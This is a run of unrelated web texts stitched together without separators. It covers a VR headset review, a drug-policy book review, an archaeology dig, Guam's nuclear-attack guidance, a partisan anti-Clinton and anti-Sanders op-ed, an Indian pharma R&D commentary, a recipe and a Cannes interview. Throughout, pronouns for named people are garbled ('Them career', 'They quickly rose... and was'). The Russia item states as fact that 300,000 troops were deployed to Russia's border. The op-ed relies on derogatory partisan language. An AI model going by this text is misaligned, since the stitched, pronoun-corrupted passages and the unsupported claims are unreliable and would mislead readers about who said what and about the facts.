Your phone display refreshes rate and gyroscope, some high-end smartphone might have better gyroscope and screen display refreshes rate , with the correct cardboard style VR headset, you might get better VR experience, but if you don't have such a high-end smartphone?
Samsung and Oculus have been working a long time to release the Gear VR, why? Till now, the Gear VR just can support 5 Samsung flagship smartphones, why? We have tried GEAR VR with Samsung S7 Edge, after you insert the S7 Edge, the gear VR will block phone's gyroscope and use the gear VR built-in one, and with the help of 2K screen, it gives you one of the best VR experience you can image with a smartphone.
However, with the all-in-one device, you don't need to worry about the above at all, they put everything into one device, they consider the screen size, lens, gyroscope and in theory, it will give you the best VR experience than just those cheap cardboard style headset. Most all-in-one device support micro SD card, you can save your huge 3D movies and play them via the micro SD card.
With the correct price, We think the all-in-one VR headset should have the market.
2 Hardware Review
HA544 is the cheapest ALL-IN-ONE device we can find in market, just $154.99, Package is like this:
The specification is clearly listed in the above photo, It uses the Rockchip RK3188 as SOC, built in 5.5inch 1080p screen, and 2800mah battery, offer up to 5 hours running time. 9 axis gyroscopes. support wifi/bluetooth. also have a 2mp camera.
Package is clean and sturdy for oversea shipping.
Now open the box, we get the following:
We have VR HMD, adjustable headstrap, earphone, micro usb cable, 2.4G air mouse remote controller with receiver, 5V/2A power adapter, user manual and Cleaning cloth.
The micro usb cable is used for charging and data sync with PC.
The air mouse is used for control the device, just insert the usb receiver to HMD.
Now let's check the detail about the VR HMD.
The total weight of this HA554 HMD is just 448g, for your reference, The Samsung Gear VR and Galaxy S7 edge weight is 441g. So it's almost the same.
Now let's check the buttons and ports in this HMD.
This HA554 offer the physical direction button and back button for operations. Most of the cardboard style VR headsets don't have those. and on the above photo, we can see , it also has three buttons in the left, the first one which marked “Nibiru” is used to for call setting menus, The second one is used for camera, the third one is power button. Long press the power on, and short press for sleep mode.
The central button is used for adjusting focal distance. so you can use this HA554 without your glasses. support 0 to 700 degree myopia.
On the other side, we have these ports:
Micro usb port for charging or data sync with PC.
Micro usb card slot for expanded, support max 32GB card;
Earphone Jack for connecting earphone;
Reset button is for manually firmware updating.
In the bottom, we just have the holes for heat radiation.
From this angle, we can see, the HA554 have the foam cushioning for better wearing experience.
It's the front face, after power on, the blue light will show like this, and camera is on the bottom, camera is 2.0mp.
During my test, i have problems with how to adjust the pupil distance, and how to find the USB port. So i make this gif for your reference :
IPD adjustment:
Where to find USB port?
Now let's check the Lens, HA554 comes with two aspherical 42mm diameter lens, and FOV is 90 degree and the lens can be easily removed from the headset. here is the photo for the lens:
Above all is the review for the hardware, We don't feel any cheap in the quality, with the adjustment IPD , focus distance and head strap, also the big FOV and physical touch button, comfortable foam cushioning, The HA554 has the good hardware for the VR HMD. Now let's check the software.
3 Software Review
Before play with HA554 VR HMD, i already played a lot of google cardboard style VR headsets and the Samsung Gear VR.
For cardboard style headset, i need to download cardboard app from play store or app store, and run the app, put the smartphone in headset, and play. If i want to play another, need to take off the phone, and run the other app again, and then put the smartphone back, it's a little annoying when you have to do this each time.
Gear VR is much better, it built in the Oculus app, once you insert your samsung smartphone, the Oculus app will run directly, and it will bring you to a virtual scene, you can download all of the apps, games, or even watch videos from this virtual scene, it has back buttoned, and touch pad, so you don't need to take off your smartphone all the time, so much better VR experience compare with cardboard.
So what about the HA554 all in one VR HMD? Here we go:
Press the power button for 3-5 seconds, the device will power on, and you will see blue light in front panel, and adjust the Pupil distance, and focal distance, wear the VR headset. you will see this:
First is system setting button, second is video player, third button is Nibiru VR app store, the fourth button is open camera, and the last one is viewing all of the installed apps.
In the second line, it will give the system status, including wifi, bluetooth, battery, and time.
and in the last, it said : Powered by Nibiru. So what's this? It doesn't seem like the usual android menu, It is said ” Powered by Nibiru” . What is Nibiru?
Here is their official site: http://www.inibiru.com/index.html?lan=1
Nibiru is a chinese software company, before they focus on the android gaming platform, but when the VR is coming, they put a lot of time in developing this Nibiru OS (base on android), They have got a lot of investment from some famous chinese company, and growing very fast. As far as i know, almost all of the all-in-one VR HMD in market are all use their OS, like Omimo, Bossnel, including our review unit HA554.
HA554 uses the new Nibiru VR OS which is also based on android, here is the software information:
Now let's check the regular setting menu:
It just offers Wlan (wifi) setting, bluetooth setting, Normal setting, system information, and gamepad setting. Let's check one by one.
Wlan Setting:
Open Wlan setting, the system will scan wifi ssid, and pick one to connect, if you have password, the keyboard will pop up like this:
You can use the direction button to enter the password, and connect.
Bluetooth
It will just like your smartphone bluetooth setting, you can turn on / off, or scan the nearby device.
Normal setting includes this:
Light means screen brightness setting;
Sound setting, i find there is no speaker in my review unit, i have to insert the earphone, and have sound.
Language, Now the Nibiru OS just offer Chinese and English , no other language.
Theme, System offer two different themes.
Sleep time, you can set the screen sleep time. it offers 1 mins, 2 mins, 5mins, 10 mins, 30mins and never sleep choice;
Time zone, you can set your correct time zone base on your country.
In System setting, it offers the following :
System update, offer two method to update system, OTA and update via SD card, also i find i can connect the HA554 with PC via micro usb cable, so flash firmware via PC should also work, just like what we did on rk3188 tv box 🙂
System Reset , i don't need much more explanation:)
About device, we have seen the screenshot earlier:)
In the end, let's check the gamepad setting, click gamepad, it gives us this option:
Seems the Nibiru OS already compatible with some 3rd party accessories, i only have the bluetooth gamepad and tested to connection, without problem.
So in the near future, we should saw some interesting accessories, like bracelet, game gun, or smartwatch as input device and accessories, that will improve our virtual reality experience a lot i think.
pc-host should be an interesting thing, can i play pc games via this setting? I haven't got a time to check this function, will update this later when i have time.
Now let's back to the main menu, check the app store:
You can download games, apps from this store, now it already has 31 games for downloading, and all of them are FREE right now. I have been told, Nibiru will add much more VR games in their store this year. and they will open sdk, and hope more and more developers join them.
click “all app” , we will see this:
File explorer is like this;
click camera app, it will open the front camera, press “ok” button to take photos.
Run VR games:
Run Cardboard:
So this is the basic software / system review. If the above simple hardware and software review can help you know this product better, it will be ok for me, but now, i will talk something useful information in my testing.
1 Can i install other app like google cardboard which is not in their app store?
Yes, you can! Just download the app you need to your pc, and copy the app to micro sd card, install the app via micro sd card. or you can directly download the app through built-in browser. But Google Play Store is not supported right now, I can't install Google Play Store since the system is not rooted. (will try that later)
2 It just can run cardboard style VR apps?
As we all know, when we use cardboard style vr headset, we have to use special VR app, means the app must already be left/right split mode first. but when i use this HA554 HMD, i find i can directly install anything, just what i did in tablet. for example, i download the antutu benchmark app and run it in this HMD:
The system directly split the screen to left/right mode and i can directly use it in this VR HMD. Still confused? another sample:
This is the cardboard demo app you usually use in cardboard style vr headset:
The content must be left/right split mode, and when you watch this from VR headset, it will give you the virtual reality experience. but when you directly run this app in HA554 HMD, here is what you get:
OH, NO, the screen is split to 4 part. and when we watch in the HA554, it is unwatchable. So does it mean HA554 can't run VR apps? Wrong.
Press the “Nibiru” button in device or remote control, there will be a menu like this:
choose the 3rd button, open VR mode. and now you will see this on screen:
It is like what you see from any other cardboard style vr headset, and you can use cardboard app without problem.
When we open VR mode, and check the same antutu app, we saw this:
This time, screen won't be split to left/right mode, but since the app don't support VR, so it becomes unwatchable in HA554.
In short. HA554 can be compatible with all apps, VR or non VR, when you run VR apps, you open VR mode. when you run regular apps, just close VR mode.
3 How to operate ?
Google use magnet in v1 cardboard, and conductive foam button in cardboard v2, Samsung Gear VR use the touch pad to operate.
without those , you have taken off your smartphone each time or use extra bluetooth controller. That will effect your VR experience.
HA554 offer 3 different operation method:
A) Physical button in device, you can use the direction button to move, ok for confirm, and also have back button and other useful buttons in device.
B) Air mouse, The HA554 includes the following simple 2.4G air mouse, just connect the receiver, and the little remote controller will work like charm.
C) Head mouse, it will use the built-in gyro, when you press Nibiru button, the system will give you this menu:
and the first one is opening Head mouse, after open that, you will saw Round cursor on screen, move your head, and the cursor will also move.
Conclusion
HA554 is first all in one VR HMD i have ever played, I spent some time to learn how to use it. but after familiar with the operation, i find it is really better than those cardboard style vr headset. I mainly use it for playing videos, standard, 3d, 360degree videos are all working well, the 1080p resolution screen can meet the standard VR experience. I don't feel obvious dizzy , and also heat seems no problem. As an entry-level all-in-one VR HMD, consider the low price, it is worth a try.
But if you serious gamers, i suggest wait for high resolution and powerful cpu/gpu all-in-one device.
Actually, i have got the newest Deepoon M2 sample, stay tuned for a high-end all-in-one VR HMD review 🙂

Lies, Damned Lies, and Drug War Statistics by Matthew B. Robinson and Renee G. Scherlen (Albany: State University of New York Press, 2007); 268 pages; $27.95.
One war appears to be going well for the United States and its allies these days: the drug war.
That was the lead in dozens of U.S. newspapers in response to a June 2007 United Nations report claiming that U.S. drug policy has led to a substantial decline in illicit drug use. Chances are the author of the story hadnt read a copy of Lies, Damned Lies, and Drug War Statistics: A Critical Analysis of Claims Made by the Office of National Drug Control Policy.
They ought to.
Written by a pair of Appalachian State associate professors — Matthew Robinson and Renee Scherlen — Lies, Damn Lies, and Drug War Statistics seeks to provide an objective, fair assessment of Americas drug war since the passage of the 1988 federal Anti-Drug Abuse Act. (The law, passed by Congress at the height of the 1980s drug-war Zeitgeist, created the White House Office of National Drug Control Policy — known colloquially as the drug czars office — and pronounced, It is the declared policy of the United States Government to create a Drug-Free America by 1995.)
Their assessment is nothing short of scathing.
Since the ONDCPs founding in 1989, trends in drug use, drug treatment, deaths attributed to drug use, emergency-room mentions of drug use, drug availability, drug purity, and drug prices are inconsistent with the goals of [the federal government], the authors assert. Yet, during this same time period, funding for the drug war grew tremendously and costs of the drug war expanded as well.
Of course, such a critical appraisal of U.S. drug policy is hardly unique. What sets Robinson and Scherlens evaluation apart is their methodology. Lies, Damned Lies, and Drug War Statistics consists primarily of the authors evaluation of the federal anti-drug agencys annual National Drug Control Strategies. These reports, issued by the ONDCP at the beginning of each year, outline the agencys policy objectives (Stop [illicit drug] use before it starts; heal Americas drug users; [and] disrupt the [illicit drug] market.) and, in theory, provide statistical proof to Congress and the public of the drug wars ongoing success.
Under close scrutiny, however, it is troublingly apparent that (a) the agency is failing to achieve its stated goals, and (b) the drug czars office is manipulating and falsifying statistics in its public reports in order to claim successes that are not warranted.
Robinson and Scherlen affirm that there is overwhelming evidence that the ONDCP is consistently making false and dishonest claims regarding the drug wars perceived progress, and the authors cite more than 80 instances of the agencys relying on inappropriate and dishonest uses of statistics to prove its case.
Examples of the agencys duplicity include:
Manipulating its budgeting techniques to exclude law enforcement and correctional costs attributable to the drug war in order to give the appearance of increasing the proportion of funding for treatment in the drug war budget.
Creating the impression of declines in illicit drug use by beginning its trend analysis in 1979 (the peak year of self-reported illicit drug use in the United States). By doing so, the agency attempts to show visually that drug use is down when it has actually not decreased during [the ONDCPs] existence. (Authors further note that although the agency consistently claims credit for alleged declines in drug use, the ONDCP fails to accept any responsibility for increases in drug use among the general population.)
Claiming that the black-market prices for illicit drugs are holding steady as a result of U.S. drug policies, when, in fact, they are generally declining.
Alleging that most U.S. drug arrests and incarcerations are for trafficking offenses, when, in fact, approximately 80 percent of all drug arrests are for possession offenses.
Abandoning previously stated goals without comment, and replacing them with new (and in recent years, far fewer) goals. Though the ONDCP generally does not … admit failure in meeting [It's] goals … it [does] use its failure to call for stepped-up efforts in the drug war, the authors note.
Of the available critiques of U.S. drug policy, Robinson and Scherlens work proves to be one of the most thorough and irrefutable, as it relies solely on the ONDCPs own rhetoric and data sources to debunk the agencys various claims. In the authors final analysis, they determine that the agency consistently and overwhelmingly fails to act in a fair, honest, or transparent manner — as required by law.
Instead, the White House Office of National Drug Control Policy predominantly operates as a generator and defender of a given ideology in the drug war, Robinson and Scherlen conclude:
This ideology asserts that illicit drugs are always bad, never acceptable, supply-driven, and must be fought through an ongoing war. This ideology asserts that fighting a war on drugs is the only way to reduce drug use and achieve related goals.
In theory, one would expect that policies that do not achieve their objectives (such as the drug war) would be discontinued…. Our assessment reveals that the ONDCP has not achieved its goals in the years since its creation. Thus, a rational response to this situation would be to terminate the ONDCP. This would save tax money, alleviate government inefficiency, and reduce the size of government. If accompanied by a reassessment of U.S. policy toward drugs, it might even result in better outcomes with regard to drug use and abuse in the United States.

A site at Marden, near Devizes, rivalled Stonehenge and Avebury in its day, says English Heritage.
The group is about to undertake a six-week dig at the site close to the village, starting on June 28.
Unlike Stonehenge and Avebury, Marden Henge no longer has any surviving standing stones, but its sheer size is astounding.
Comprising a substantial and well-preserved bank with an internal ditch enclosing an area of some 10.5 hectares – equivalent to ten football pitches – it is one of the largest Neolithic henges in Britain.
Archaeologists are particularly intrigued by evidence of a huge mound at the centre of the henge similar to a smaller version of Silbury Hill.
The mound collapsed in 1806 and was levelled by 1817. English Heritage hopes to find out more about this feature by obtaining dating material from any surviving features within its centre.
Jim Leary, the English Heritage archaeologist who was involved in the recent restoration of Silbury Hill, said: “Marden Henge deserves to be understood more, partly because of its size, but also due to its proximity to the more famous stone circles at Avebury and Stonehenge.
“How Marden relates to them is another layer of interest which we want to study.
“We are potentially looking at a much more intricate system of Neolithic ritual sites in this part of the world than we previously thought.”
The Henge is on the road out of the village towards Beechingstoke, at Hatfield Farm, and is a popular picnic area.
Parish council chairperson Peter Bell was pleased with the news. They said: “I hadn't heard English Heritage were planning this, but I am delighted. It is an important local archaeological site and we don't know nearly enough about it.”
The Henge is on the road out of the village towards Beechingstoke, at Hatfield Farm, and is on private land.
Sue Shepherd-Cross, who lives at Hatfield Farm, was delighted at the news. They said: “It is a remarkable place and it would be fascinating to find out more about it.”
The website Megalithic.co.uk describes Marden Henge, or Hatfield Earthworks, as the largest henge in Britain. It adds: “There is not much to see but bank and ditch. Plenty of atmosphere, though.”
* A midsummer's eve picnic party is taking place at Marden Henge on Saturday June 26 at 8.15pm in aid of the Fairyland Trust which is a children's conservation society.
Japanese "starchitect of the people" and 2014 Pritzker winner Shigeru Ban is the only architect on Foreign Policy magazine's annual list of "100 Leading Global Thinkers." The honor, a fairly big deal in political and economic circles, notes Ban's "commitment to cheap, recyclable materials" like paper tubes and cardboard, and the fact that they have designed not only major art museums (with tortoise-related PR problems), but also cardboard cathedrals, paper nursery schools, and other shelters for natural disaster survivors.
Oddly, the commendation also mentions that Ban's old professor, architect Peter Eisenman, refers to them as Sugar Bear, and that their mother, a dressmaker in Tokyo, designs all their clothes.

Yet while you can take the kid out of the revolution, you can't take the revolution out of the kid. Or the geriatric. Ask Bernard and Hillary about that.
So, what happened to all those swell kids who were “down” with the revolution back in the 1960s? They grew up, and now they've grown old. Out went the love beads, bellbottoms, and acid trips (cheaper than cruises to Bimini). Most of those fist-pumping, LBJ and Nixon hating, protesting kids swapped central casting hippie costumes for suits and desk jobs.
The irony is ripe to near rotting. Leftism, very much premised on youth back in the heady 60s, very much about ousting the old white guys in politics -- Republican and Democrat -- is today in the wrinkled hands of two Social Security eligible pols, the old white gal, Hillary Rodham Clinton, and the old white guy, Bernard “Bern” Sanders. Well, the reds have always preached about cradle to grave.
Hill and Bern each want to lay claim to their party's presidential nomination next year. Beyond that, the presidency. Both will shortly begin beating the stuffing out of each other. Both are reds, though per the spin, Bern is the purer red.
Hill, goes the critique, is the compromised of the two. A crony capitalist underbelly afflicts William Jefferson Clinton's 40-year bride… a grubby acquisitiveness -- and not just for power to make the world more compassionate, fairer, and equal -- is an itch Hill must scratch. Shakedowns -- err, speeches -- have made Bill and Hill mucho rich reds. Influence-peddling was added to the Clintons' portfolio when Hill served as O's secretary of state.
The fiction circulating among 73-year-old Bern's fans is that he's got a pure, youthful socialist heart. The seediness of day-to-day politics -- Bern's held elective offices since 1981 -- doesn't touch him. They never swallows principles to cut deals. He's virginal, politically. The left never tires of mythmaking; its entire worldview is built on myths. Bern is currently a myth manufactured by the left that's dutifully reported by the MSM.
Bern's getting a free ride. Their warts and all are mostly under wraps. The nearing 68-year-old Hill is under fire for doing something convenient with their State Department emails. The convenience was doubtlessly aimed at eluding culpability. Shucks, in that Arkansas old white guy Democrat fashion, Hill and Bill are perpetually eluding culpability.
But Bern's free ride will end, sure as there was a hammer and sickle on the Soviet flag. Frontrunners are targets. If not leading Hill now, Bern is getting mighty close to acquiring the frontrunner tag. Soon -- very soon -- we'll start hearing and reading things about Bern that will tarnish their pristine reputation. Moses will be exposed as having clay feet.
In fact, the scuttlebutt is that Hill's campaign has deployed opposition researchers to Vermont to dig around about Bern's lengthy past. This from the Vermont publication, Seven Days, dated July 1, 2015, and headlined: “Has Clinton Dispatched Oppo Researchers to UVM's Sanders Archive?”
Librarians at the University of Vermont's special collections say interest is spiking in the "Bernard Sanders papers" -- 30 boxes of meticulously organized material documenting Sanders' eight years as mayor of Burlington.
Then this:
Last Thursday, two casually dressed twentysomethings were spotted combing through the Sanders files and decades-old Vermont newspapers. As they were on their way out the door at the end of the day, Seven Days asked what they were doing.
"No comment," said one of the young men, dressed in a T-shirt and flannel. "No comment."
The reporter's suspicion: the guys were Clinton operatives.
You can bet your Norman Thomas bobble-head that Hill's peeps are everywhere necessary to excavate anything that will yellow Bern's snowy reputation. Not that reputation-tarnishing will matter to Bern's true believers, many of whom are inexplicably young folk. Delusion is yet another device used by leftists to deflect hard realities. The young are particularly prone to delusion.
It's curious that in a culture so wed to the adolescent, so adverse to aging, so insistent that the old not only can, but should, be young in appearance (at heart runs second), the Democrats leading candidates look like a dowdy grandma and a Burlington corner grocer, circa 1950 -- you know, the curmudgeonly “Old Mister Overalls” or some such.
Curious still that socialism, which spent much of the 20th Century attempting to convince the proletariat that it was progressive, futuristic, forward-looking -- bursting with vim, vigor, and vitality -- has devolved into dystopia.
Racial tensions flare or explode where brotherhood is supposed to rein. Many among the proletariat get by on part-time jobs or unemployment checks. Washington government lists with gargantuan debt, and piles up more daily, threatening eventual capsize. Well-heeled bureaucrats ceaselessly act to expand their mandates while eating out the nation's substance. Pols-turned-lobbyists and consultants get rich quick. The nation's borders are comprised, intentionally flooded with job-stealing and welfare-subsisting illegals. National security is given short shrift.
That, in part, is socialism -- i.e., progressivism -- in practice today. It's the left's version of the decline of the Roman Empire, not some uplifting of humanity and society to ever-greater heights. Where's the perfection of the human, so ballyhooed in the left's heyday? Where's the glorious future, once rhapsodized among lefties? Hmm?
Socialism -- under whatever guise -- is, in fact, old, tired, creaky, squalid, and failed. Where, pray tell, is its death panel?
In the meanwhile, two geezer socialists vie to lead the party of doubled-down failed socialism into the 2016 presidential elections. Another of their ilk, Joe Biden (age 72), a preening buffoon with a mean streak, is mulling entry, presumably to rescue the Democrats from a politically hobbled Hill and Bern the Pure, but surely to simply aggrandize himself. Deeper in the wings lurks Liz Warren, a proud faux Native American and another “democratic” socialist. She's a spry 66. Martin O'Malley (he of Putin shirtless virility) is just 52 and an also-ran. Presumably, their relative youth is a disqualifier.
Ageism in any of this? Only to leftists eager to vilify anyone who deviates an iota from the party line. Age and experience can bring wisdom. Wisdom has always been a scarce commodity -- more so today, however. Hill's and Bern's wisdom consists of clichés and lies; hence, it's no wisdom at all. Just the same old, same old -- meaning greater trouble for a troubled nation if either is elected president.
New book highlights Mayo stories during Irish struggle for independence
Neill O'Neill
A new book will be launched on Friday, which gives a fascinating insight into the War of Independence and Civil War in Mayo.
In the 1940s and 1950s, Ernie O'Malley travelled around Ireland interviewing survivors of the struggle for independence.
These interviews are now being made available for the first time and they give a unique, first-hand account, of those turbulent years in Irish history and the people who fought for Irish independence.
Many of those who were interviewed at the time were unwilling to talk, but because Ernie O'Malley was such a well-known and respected figure, they consented to their interview requests.
Born in Castlebar in 1897, Ernie O'Malley was a medical student in Dublin when the 1916 Rising broke out. Although initially indifferent, they soon came to sympathise with the Republican viewpoint and joined the Irish Volunteers, later to become the IRA.
They quickly rose through the ranks and was soon organising the Volunteers around the country, reporting directly to Michael Collins and Richard Mulcahy.
In later decades, O'Malley took on the task of preserving the memories of those who lived through the War of Independence and Civil War, travelling around Ireland in the process.
The book ‘The men will talk to me' focuses solely on Mayo, and is edited by Ernie's son Cormac O'Malley and Vincent Keane. Cormac works as an international lawyer and has been extensively involved in ensuring that their father's writings are made accessible to all those interested in Irish history.
Vincent Keane is from Westport, where they are an active member of the local historical society and is familiar with the families of many of the interviewees featured in the book.
There are ten fascinating interviews in‘The men will talk to me', from across Mayo. They are with Michael Kilroy, Paddy Cannon, Paddy Duffy, Tommy Heavey and Broddie Malone from West Mayo; Tom Maguire from South Mayo; Matt Kilcawley and PJ Ruttledge from North Mayo and Johnny Grealy and Tom Carney from East Mayo.
The book launch will be performed by An Taoiseach, Enda Kenny on Friday next, April 25, at 6.30pm in Mayo County Library, John Moore Road, Castlebar.
The recent agitation by scientists, asking for more allocation of funds, underlines the need to focus on science and innovation as a priority area. One of the biggest constraints to advancing scientific research is the lack of sufficient funding and inadequate allocations by the government.
At 0.83% of gross domestic product (GDP), India is among the countries with the lowest investment in scientific research. While India boasts of several innovations in the non-formal sector, breakthrough scientific research, especially in healthcare, has been markedly lacking. New medicines, devices, diagnostics, patient aids and monitoring tools are mostly imported, often coming to India several years after they are available to patients in the developed world.
An industry study of 2016 examined the extent to which public investment, intellectual property rights and drug pricing policies in 56 countries actively contribute to or detract from innovation in global life-sciences. Not surprisingly, India ranked among the lowest (in the bottom five) due to weak intellectual property protection, lack of data protection for biologics, low investment in R&D and price regulations, all of which contribute to reduced revenue and therefore reduced future investment in biopharmaceuticals.
India also ranked No.19 in a 28-nation survey of biomedical investment attractiveness of countries, with an overall score of 59 out of 100. Five metrics were used to determine rankings: scientific capabilities and infrastructure; clinical research conditions and framework; regulatory system; market access and financing; and effective intellectual property protections. India scored low on almost all metrics except for partial step-ups on scientific capabilities and infrastructure, and clinical research conditions and framework.
India's growing economy, coupled with its changing “epidemiological profile" with cardiovascular problems and other chronic diseases, make it a strong candidate to become a future powerhouse of R&D and manufacturing in pharmaceuticals. In addition, clean water, rising incomes and better health infrastructure for the nation are contributing to an ageing population with a greater demand for different types of pharmaceutical drugs. Some of the leading domestic pharma manufacturers are emerging as innovators, both in-house and through external collaborations. Patients are also beginning to benefit from research advancement in the Indian industry. For instance, Biocon's insulin product that can be consumed orally could provide relief from the burden of daily injections for millions of people with diabetes worldwide, including 67 million in India.
While these are early signs of success, the industry has a long way to travel. The R&D investment as a percentage of sales has been rising for several years and now stands at 6% for some Indian companies. This is still well short of the 20% typical of Western pharma companies. Moreover, innovation in chronic diseases and rare diseases has not yet taken off.
The education system is to blame as well, imparting theoretical knowledge with no emphasis on product development and application of theory. This leads to the deterioration of the knack for problem-solving and innovation. Those who manage to keep their enthusiasm alive for research have to deal with the lack of facilities or face delayed funding issues. Educational and academic institutions should be encouraged to participate in research programmes with funding from both the government and the private sector.
An October 2016 PwC report, “Unlocking India's Potential For Leadership In Pharmaceutical Innovation", highlights four pillars for strengthening the innovation environment in the biopharmaceutical industry: human resources, finances, infrastructure, and legal and regulatory framework. Each of these pillars needs a concerted focus and a long-term commitment from industry as well as the government. The environment to support the development of these verticals could emerge through our various government-led initiatives such as Skill India, Make in India, Atal Innovation Mission, etc.
However, in order to support consistent innovation, investment has to increase substantially before any tangible outcomes can be envisioned. More regulatory changes are required and Indian pharmaceutical companies need to be supported with more financial and social capital if we are to see meaningful drug research that can address the healthcare needs of India. A strong patent system and robust intellectual property rights environment is required to encourage research and to enable foreign pharma companies to bring new products to the market. Without the requisite investment and enabling policy environment, patients in India will continue to suffer due to lack of access to cutting-edge medicines and new diagnostics.
Short-term populist measures like imposing price ceilings do not contribute to improving patients' access to innovative life-saving medicines and devices; a more holistic approach is needed. Without building a robust innovation and research platform, a top-notch educational and learning environment, and state-of-the-art research facilities, price control on medicines and devices could lead to serious concerns like delayed or absent access to innovative technology, continued rise in the cost of therapies and quality concerns across the spectrum of healthcare.

WASHINGTON (Reuters) - Guam posted emergency guidelines on Friday to help residents prepare for any potential nuclear attack after a threat from North Korea to fire missiles in the vicinity of the U.S. Pacific territory.
Pyongyang's state-run KCNA news agency said on Thursday its army would complete plans in mid-August to fire four intermediate-range missiles over Japan to land near Guam as North Korea and the United States engaged in increasingly heated rhetoric this week over the North's nuclear weapons program.
North Korea did not threaten Guam with a nuclear attack, but the crisis between Pyongyang and the United States has stirred fears that a nuclear conflict could break out in the region.
While the governor of Guam shrugged off the North's missile warning and said there was no heightened threat, the government has issued a preparedness fact sheet.
In language that evoked the specter of nuclear conflict during the Cold War, the guidelines cover what to do before, during and after a nuclear attack.
“Do not look at the flash or fireball – It can blind you,” it said. “Take cover behind anything that might offer protection.”
“Remove your clothing to keep radioactive material from spreading. Removing the outer layer of clothing can remove up to 90% of radioactive material,” read the guidelines of what to do if caught outside.
They suggest having an emergency plan and supply kit and making a list of potential concrete structures near home, work and school to serve as fallout shelters.
“Fallout shelters do not need to be specifically constructed for protecting against fallout,” it said. “They can be protected space, provided that the walls and roof are thick and dense enough (i.e. concrete) to absorb radiation given off by fallout particles.”
The fact sheet advises people on how to wash: do not scrub or scratch the skin, use soap, shampoo and water but do not put not conditioner on your hair because it binds radioactive material.
It offers advice for parents who are away from their children during a strike.
“Stay where you are, even if you are separated from your family,” it said. “Listen to the news. Do not call the school. Be patient. Wait for instructions to pick up your child.”
The information on the fact sheet was gathered from the U.S. Department of Homeland Security website www.ready.gov, a Guam Homeland Security spokesperson told the Pacific Daily News.
Guam is home to about 163,000 people and a U.S. military base that includes a submarine squadron, an air base and a Coast Guard group. (For a graphic on North Korean missile trajectories, ranges click tmsnrt.rs/2hIzZHG)
U.S. President Donald Trump on Thursday warned North Korea against threatening Guam and said on Friday that the U.S. military was “locked and loaded, should North Korea act unwisely.”

Asked about Trump's tough posture, Guam Governor Eddie Calvo said they agreed with sending a clear message to North Korean leader Kim Jong-un, who has ramped up their country's tests of missiles and nuclear bombs.
“Though I don't want the temperature to get any higher, I think it's important also that there is clarity and that if there is an attack on any American soil including Guam, that it will be met with overwhelming response,” Calvo told reporters on Friday. “I don't have any problem with that.”

Says US Must Continue to 'Stand Up' to Russia
Days after publicly assuring NATO that President-elect Donald Trump wouldn't make serious changes to America's European policy, outgoing President Barack Obama is publicly making statements “urging” Trump to remain hostile toward Russia and not “cut deals” with them.
Obama's comments mirror demands from NATO members since the US election, all of them bent out of shape at the Trump's talk of a rapprochement with Russia. Trump has since spoken to Russian President Vladimir Putin and the two agreed to normalization of ties between their nations.
That's not sitting well with Obama either, and he's now insisting that the US needs to “stand up to Russia” because they view the world differently. The US and NATO have in recent months deployed some 300,000 ground troops to the Russian border.
While predictions of a Russian invasion of Eastern Europe never panned out, the US and NATO have continued to build up their military position on Russia's border, and continued to rail against Russia over any and every perceived slight. The costly deployments would be at stake if US ties with Russia improve, which has many officials interested in maintaining the status quo by pushing Trump to remain on a hostile footing with Russia.

To make tasty veg lollipops I always use assorted vegetables with a mashed potato base. These veggie pops are mildly flavored with minimum seasoning especially palatable to toddlers and kids. Also I have made these with neutral flavor. The seasonings are just salt, pepper and chili flakes.
For making Indian style veg lollipop you can easily vary the seasoning. You can add garam masala, cumin powder red chili powder etc. Also you can make continental style veggie lollipops with mixed dried herbs, sour cream etc.
In this recipe, mashed potatoes and corn flour act as binding agent. The dipping sauce adds an interesting flavor to this veg lollipop. You can either drizzle the sauce over the lollipops or serve separately. You can shape the lollipops well ahead and refrigerate.
I have shallow fried the lollipops. You can also deep fry or air fry or bake them. Also you can make the balls and refrigerate for few hours. Fry just before serving to retain the crispness. The recipe can be easily doubled and halved.
Serve veg lollipops hot as snack or starter.

When Netflix's ruthless political drama House of Cards launched in 2013, the concept of a megalomaniac at the helm of the Oval Office seemed much closer to fantasy than reality. But now, in the wake of Donald Trump's takeover of the White House, the show's co-star Robin Wright, who plays the quiet, stoic but cutthroat Claire Underwood, wife to Kevin Spacey's narcissist President Francis Underwood, joked that political reality has become stranger than fiction.
“He's [Trump] stolen all of our ideas for season six,” quipped Wright, speaking Thursday at a Kering Women In Motion talk in Cannes.
“I've got to see the hope somewhere,” they said, before adding they wanted to see Michelle Obama take the top job someday. “I think she'd make a great President.”
Cannes Film Festival
Wright is hitting the Croisette with their debut feature short The Dark Of Night, starring Leslie Bibb, Sam Rockwell and Callie Thorne and written by Denise Meyers. They direct the 10-minute noir thriller about an unemployed insurance adjuster who finds themselves in the wrong place at the wrong time. The film is screening in the festival's Cannes Classics section.
“It was a labor of love,” said Wright of the crowdfunded project. It's not their first time behind the lense either: Wright has directed seven episodes of House Of Cards after their co-star Spacey turned down the offer to direct. “Kev said, ‘I'm too busy, I'm too busy,' so I said, ‘I'll do it.' They said ‘OK, let's try it.' They gifted me that. I've had cinema school through Netflix.”
Them career as an actor has, they said, helped shape their abilities behind the camera. “The principal difference is, when you direct, that's a title. It's an alpha position. You're directing someone to do something. It's like watching an animal prey or watch for food…To watch it as a director, it's more important to let the actor play a little bit because they have to get it out of their system. Let them shake their hair out and run around in the dog park.”

When Wright was initially offered the part of Claire in House Of Cards, they admit they were reticent to return to television but the fact that it was sold to them on the basis that they were going to develop their character, one that they could help create, was the reason they said yes.
“Claire Underwood is the best of both sexes,” they said. “Francis annihilates people. They devour. He's so effusive. He's so direct and so verbal and building that balance between their quietness and stoicism and observing was key.”
They added: “She's their Lady Macbeth to their Richard III.”
The conversation about gender parity in the film business, particularly the lack of female directors in the movie pool, is one that the business needs to keep having, they said. “It's about opening up perspective,” they said, adding that it's not just more women, but more nationalities that need to be called upon to take the plunge into the director's seat. “Can we just get more nationalities and more perspectives in the film industry just to see through their lens?”
They added: “Feminism means equality. Period. Equal work and equal pay.”
Since being on House Of Cards, Wright said their confidence as a woman in the workplace has grown. “We're all producers on it. There's a team of us working and evolving the show. We didn't know the arc and where it was going to end…but we are all equally important on the show.”
Wright revealed that they already had an end in mind for the show, but they refused to disclose any details.
Netflix has been the subject of controversy here in Cannes this year. After two of the streamer's projects – Okja and The Meyerowitz Stories – were selected to screen in competition at the fest, French exhibitors were up in arms with the fact the festival was supporting films that were not geared towards a theatrical release. The outcry even prompted the festival to deem that, from 2018 going forward, all films screening in the festival were subject to a local theatrical release.
When queried about the controversy, Wright was unaware of the local debate.
